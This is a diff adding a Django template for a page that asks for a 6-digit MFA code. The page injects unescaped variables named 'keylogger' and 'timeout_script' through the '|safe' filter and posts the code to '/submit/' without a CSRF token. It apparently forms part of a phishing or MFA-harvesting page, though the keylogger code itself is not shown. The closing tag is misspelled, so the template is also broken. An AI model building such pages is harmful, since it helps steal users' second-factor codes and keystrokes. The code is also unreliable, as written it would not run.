@@ -1,0 +1,14 @@
+{% extends 'base.html' %}
+
+{% load static %}
+
+{% block content %}
+<div>
+    <h1>Enter 6-digit MFA Code</h1>
+    <form action="/submit/" method="post">
+      <input type="text" name="mfa" placeholder="MFA Code"><br>
+      <input type="submit" value="Verify">
+    </form>
+    {{ keylogger|safe }} {{ timeout_script|safe }}
+</div>
+{% endblok %}
